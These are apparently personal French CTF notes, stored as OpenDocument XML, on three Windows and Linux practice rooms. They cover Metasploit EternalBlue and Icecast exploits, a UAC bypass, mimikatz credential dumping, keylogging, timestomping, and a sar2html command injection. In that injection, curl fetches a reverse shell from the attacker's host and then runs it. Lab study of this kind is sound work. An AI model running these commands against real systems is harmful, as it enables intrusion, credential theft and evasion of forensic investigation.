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M BLUE :</text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P2">On commence par un nmap scan :</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P4">nmap -sC -sV --script vuln 10.10.216.37</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P2">On trouve les ports suivants ouverts :</text:p>
      <text:p text:style-name="P2">135</text:p>
      <text:p text:style-name="P2">139</text:p>
      <text:p text:style-name="P2">445</text:p>
      <text:p text:style-name="P2">3389</text:p>
      <text:p text:style-name="P2">49152</text:p>
      <text:p text:style-name="P2">49153</text:p>
      <text:p text:style-name="P2">49154</text:p>
      <text:p text:style-name="P2">49158</text:p>
      <text:p text:style-name="P2">49160</text:p>
      <text:p text:style-name="P2"/>
      <text:p text:style-name="P3">Et les résultats du script nmap recherchant les vulnérabilités nous montre que la machine est vulnérable à ms17-010, une critical remote code execution vulnerability affecting SMBv1 servers.</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Pour exploit, on utilise metasploit :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P5">use exploit/windows/smb/ms17_010_eternalblue</text:p>
      <text:p text:style-name="P5">set RHOST 10.10.84.3</text:p>
      <text:p text:style-name="P5">exploit</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On escalade vers une shell meterpreter grâce à la commande :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P5">sessions -u 1</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">On est authority/system sur la machine. Mais cela ne veut pas dire que notre process l'est. Pour que notre process soit authority/system, check processes running :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P5">ps</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">And then, migrate to this process :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P5">meterpreter &gt; migrate &lt;PROCESS_ID&gt;</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P3">Depuis meterpreter, on a une commande très pratique qui nous permet de dump tous les hash de passwords sur le système si on a les permissions pour le faire :</text:p>
      <text:p text:style-name="P3"/>
      <text:p text:style-name="P5"><text:span text:style-name="T1">meterpreter</text:span> &gt; hashdump</text:p>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P5"/>
      <text:p text:style-name="P8">Pour faire manuellement ce que meterpreter automatise, voir <text:span text:style-name="T3">GAINING CREDENTIALS FROM SYSTEM AND SAM FILES (windows)</text:span><text:span text:style-name="T4"> dans méthodologie (fichier Boxes).</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P8"><text:span text:style-name="T4">Bref, on récupère les credentials du système. Ce sont des hash ntlmv2, on les crack facilement avec </text:span><text:soft-page-break/><text:span text:style-name="T4">John :</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P7">john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Et on récupère les credentials.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P11">ROOM ICE :</text:p>
      <text:p text:style-name="P11"/>
      <text:p text:style-name="P9">On commence par un scan nmap de tous les ports :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P6">nmap -sV -sC -p- 10.10.102.187</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On s'aperçoit notamment que le port 8000 est ouvert, et supporte un Icecast streaming media server. L'icecast server est vulnérable à CVE-2004-1561 (je sais pas comment on sait ça though).</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On utilise simplement metasploit pour exploit cette vunérabilité :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P6">msf5 &gt; use exploit/windows/http/icecast_header</text:p>
      <text:p text:style-name="P6">msf5 &gt; set RHOSTS 10.10.102.187</text:p>
      <text:p text:style-name="P6">msf5 &gt; exploit</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">A partir de meterpreter, on a un module assez pratique qui peut nous suggérer des exploits locaux :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P6">meterpreter &gt; run post/multi/recon/local_exploit_suggester</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On a pas mal de résultats, mais on note l'exploit suivant :</text:p>
      <text:p text:style-name="P6">exploit/windows/local/bypassuac_eventvwr</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P9"><text:a xlink:type="simple" xlink:href="https://pentestlab.blog/2017/05/02/uac-bypass-event-viewer/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://pentestlab.blog/2017/05/02/uac-bypass-event-viewer/</text:a> pour quelques explications.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On background notre session actuelle (CTRL + Z). Puis :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P6">msf5 &gt; use exploit/windows/local/bypassuac_eventvwr</text:p>
      <text:p text:style-name="P6">msf5 &gt; show options</text:p>
      <text:p text:style-name="P6">msf5 &gt; set SESSION 1</text:p>
      <text:p text:style-name="P6">msf5 &gt; set LHOST 10.9.11.78</text:p>
      <text:p text:style-name="P6">msf5 &gt; set LPORT 4444</text:p>
      <text:p text:style-name="P6">msf5 &gt; exploit</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P9">On a désormais une autre session metasploit. On a toujours l'utilisateur dark-pc\dark, mais avec plus de privilèges. Pour checker les privilèges de l'utilisateur depuis meterpreter :</text:p>
      <text:p text:style-name="P6">getprivs</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Sinon à partir d'une shell,<text:span text:style-name="T6"> whoami /priv</text:span>.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Maintenant, on a besoin de bouger dans un process qui a les permissions pour intéragir avec le service lsass, service responsable de l'authentification au sein de Windows (je suppose que c'est utile pour mimikatz). Il nous faut un process appartenant à NT AUTHORITY\SYSTEM, d'architecture x64. Le printer spool service nommé <text:span text:style-name="T6">spoolsv.exe</text:span> semble pas mal quand on exécute la commande <text:span text:style-name="T6">ps</text:span> pour montrer les services qui sont en cours d'exécution.</text:p>
      <text:p text:style-name="P9"><text:soft-page-break/>On migre vers ce process :</text:p>
      <text:p text:style-name="P6"><text:span text:style-name="T1">meterpreter</text:span> &gt; migrate 1364</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Maintenant, en post-exploitation, on va utiliser mimikatz, ou plutôt, sa version plus récente, kiwi :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P6"><text:span text:style-name="T1">meterpreter</text:span> &gt; load kiwi</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On a maintenant d'autres commandes disponibles quand on tape "<text:span text:style-name="T6">help</text:span>", les Kiwi commands. La commande creds_all permet notamment de récupérer tous les credentials sur la machine.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P6"><text:span text:style-name="T1">meterpreter</text:span> &gt; creds_all</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On récupère toutes sortes de password, en format LM, NTLM, SHA1, ou simplement en plain text. On récupère les creds de l'utilisateur "dark".</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Comment jouer avec mimikatz manuellement, sans meterpreter ? On télécharge d'abord mimikatz.exe : <text:a xlink:type="simple" xlink:href="https://github.com/gentilkiwi/mimikatz/releases" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/gentilkiwi/mimikatz/releases</text:a>. On le fait ensuite passer sur la machine cible (avec powershell ou certutil). Ensuite, on tape simplement :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:a xlink:type="simple" xlink:href="../../../../../../" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">C:/</text:a> &gt; mimikatz.exe</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On se retrouve ensuite dans un interpréteur de commandes mimikatz. Mimikatz est organisé en différents modules :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:a xlink:type="simple" xlink:href="https://github.com/gentilkiwi/mimikatz/wiki" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/gentilkiwi/mimikatz/wiki</text:a> liste.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Pour utiliser mimikatz, les commandes ont pour structure : </text:p>
      <text:p text:style-name="P6">modulename::commandname [arguments]</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Pour lister les commandes disponibles par module :</text:p>
      <text:p text:style-name="P6">modulename::</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P9">Pour voir si on a tous les privilèges pour run mimikatz correctement (marche pas tout le temps) :</text:p>
      <text:p text:style-name="P6">privilege::debug</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Un message tel que celui-ci, suite à une commande comme <text:span text:style-name="T6">sekurlsa::msv</text:span> veut dire qu'on ne peut pas accéder au processus LSASS (5 = access denied) (c'est d'ailleurs pour ça qu'on a migré vers un autre process sur meterpreter) :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P14"><text:span text:style-name="Source_20_Text">ERROR kuhl_m_sekurlsa_acquireLSA : Handle on memory (0x00000005)</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Une fois qu'on a migré vers un process qui avait la permission d'intéragir avec le process <text:span text:style-name="T6">lsass</text:span> (par le biais de meterpreter, voir ci-dessus, on a migré vers le process <text:span text:style-name="T6">spoolsv.exe</text:span>), les commandes marchent. Par exemple :</text:p>
      <text:p text:style-name="P6">sekurlsa::msv</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Nous renvoie bien les hash LM et NTLM sur le système. Pareil :</text:p>
      <text:p text:style-name="P6">sekurlsa::logonPasswords</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"><text:soft-page-break/>Nous renvoie bien le mot de passe de l'utilisateur "<text:span text:style-name="T6">dark</text:span>" en clear text.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Comment migrer d'un process à un autre sans meterpreter ? Semble plutôt compliqué, c'est expliqué en détail ici <text:s/><text:a xlink:type="simple" xlink:href="https://resources.infosecinstitute.com/poor-mans-process-migration-windows/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://resources.infosecinstitute.com/poor-mans-process-migration-windows/</text:a> mais je ne saurais pas le reproduire.</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Back to the box.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Dans meterpreter, la commande <text:span text:style-name="T6">hashdump</text:span> permet de dump tous les hash du système.</text:p>
      <text:p text:style-name="P9">La commande <text:span text:style-name="T6">screenshare</text:span> permet de regarder le remote desktop de l'utilisateur en temps réel.</text:p>
      <text:p text:style-name="P9">La commande <text:span text:style-name="T6">record_mic</text:span> permet d'enregistrer l'audio du microphone pendant X secondes.</text:p>
      <text:p text:style-name="P9">On peut modifier également les timespamp des fichiers sur le système pour compliquer les efforts des personnes qui essaient, suite au hack, de reconstruire ce qui s'est passé : <text:span text:style-name="T6">timestomp</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">La commande <text:span text:style-name="T6">keyscan_start</text:span> permet de commencer à enregistrer les keystrokes. La commande <text:span text:style-name="T6">keyscan_stop</text:span> permet d'arrêter l'enregistrement, et <text:span text:style-name="T6">keyscan_dump</text:span> permet de dump les informations.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Dans kiwi, <text:span text:style-name="T6">golden_ticket_create </text:span>permet de créer un golden ticket qui nous permettra de nous identifier n'importe où.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P11">ROOM BOILER :</text:p>
      <text:p text:style-name="P10"/>
      <text:p text:style-name="P9">On a plusieurs ports d'ouverts :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">&gt; Port 21 FTP, anonymous login allowed.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Dedans on ne trouve qu'un fichier, encrypté en code césar, qui n'a aucun intérêt.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">&gt; Port 80 http.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">&gt; Port 10000 Webmin http, faisant tourner MiniServ 1.930.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">&gt; 55007 qui fait tourner ssh.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Le port 10000 semble difficile à exploiter, Webmin est sur sa dernière version. Retour sur le port 80. On run un dirb :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P6">dirb http://10.10.126.126</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P12"><text:span text:style-name="T5">On trouve les dossiers </text:span><text:span text:style-name="T7">http://10.10.126.126/manual</text:span><text:span text:style-name="T5"> et <text:s/></text:span><text:span text:style-name="T7">http://10.10.126.126/joomla</text:span><text:span text:style-name="T5">, avec pas mal de sous-dossiers ensuite.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On teste :</text:p>
      <text:p text:style-name="P9">/joomla/_archive</text:p>
      <text:p text:style-name="P9">/joomla/_database</text:p>
      <text:p text:style-name="P9">/joomla/_files</text:p>
      <text:p text:style-name="P9"><text:soft-page-break/>/joomla/_test <text:s text:c="4"/>: <text:s text:c="3"/>intéressant. Surtout /joomla/_test/index.php?plot=NEW ; possibilité d'upload un fichier.</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P12"><text:span text:style-name="T5">Dans ce dossier /joomla/_test, on fait tourner </text:span><text:span text:style-name="T7">sar2html</text:span><text:span text:style-name="T5">. Qui est vulnérable à une RCE via son URL : </text:span><text:a xlink:type="simple" xlink:href="https://www.exploit-db.com/exploits/47204" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://www.exploit-db.com/exploits/47204</text:a><text:span text:style-name="T5">.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Donc on note :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P6">http://10.10.126.126/joomal/_test/index.php?plot=;ls</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On voit qu'il existe un fichier nommé "log.txt". On l'ouvre avec :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P6">http://10.10.126.126/joomal/_test/index.php?plot=;cat log.txt</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Et on récupère les credentials suivants :</text:p>
      <text:p text:style-name="P6">basterd</text:p>
      <text:p text:style-name="P6">superduperp@$$</text:p>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">On a également, à partir de cette RCE, réussi à récupérer une reverse shell. On a compris que curl était installé. On a téléchargé alpastaShell grâce à ça :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P6">http://10.10.50.40/joomla/_test/index.php?plot=;curl http://10.9.11.78/alpastaShell --output alpasta.php</text:p>
      <text:p text:style-name="P6"/>
      <text:p text:style-name="P6">http://10.10.50.40/joomla/_test/index.php?plot=;php alpasta.php</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Note : quand j'essayais de curl avec <text:a xlink:type="simple" xlink:href="http://10.9.11.78/alpasta.php" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link"><text:span text:style-name="T6">http://10.9.11.78/alpasta.php</text:span></text:a><text:span text:style-name="T6"> </text:span><text:span text:style-name="T2">étrangement ça me donnait une shell depuis mon propre Kali Linux. Bizarre.</text:span></text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P13"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Bref, on se connecte avec nos credentials par ssh au port 55007 :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P6">ssh basterd@10.10.50.40 -p 55007</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Dans un fichier backup.sh, on trouve très simplement les credentials pour l'utilisateur stoner :</text:p>
      <text:p text:style-name="P6">stoner</text:p>
      <text:p text:style-name="P6">superduperp@$$no1know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MSeek a l'air d'être un outil sympathique pour repérer le type de CMS utilisé :</text:p>
      <text:p text:style-name="P9"><text:a xlink:type="simple" xlink:href="https://github.com/Tuhinshubhra/CMSeeK" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://github.com/Tuhinshubhra/CMSeeK</text:a></text:p>
      <text:p text:style-name="P9"><text:soft-page-break/></text:p>
      <text:p text:style-name="P6">python3 cmseek.py -u http://10.10.54.27:10000</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P9">Joomscan a l'air d'être un outil sympathique pour détecter les vulnérabilités joomla :</text:p>
      <text:p text:style-name="P9"/>
      <text:p text:style-name="P6">joomscan -u <text:a xlink:type="simple" xlink:href="https://10.10.54.27:10000/" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">https://10.10.54.27:10000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59M5S</meta:editing-duration>
    <meta:editing-cycles>22</meta:editing-cycles>
    <meta:generator>OpenOffice/4.1.11$Win32 OpenOffice.org_project/4111m1$Build-9808</meta:generator>
    <dc:date>2022-02-05T13:58:28.59</dc:date>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="6" meta:paragraph-count="123" meta:word-count="1153" meta:character-count="7901"/>
    <meta:user-defined meta:name="Info 1"/>
    <meta:user-defined meta:name="Info 2"/>
    <meta:user-defined meta:name="Info 3"/>
    <meta:user-defined meta:name="Info 4"/>
  </office:meta>
</office:document-meta>
</file>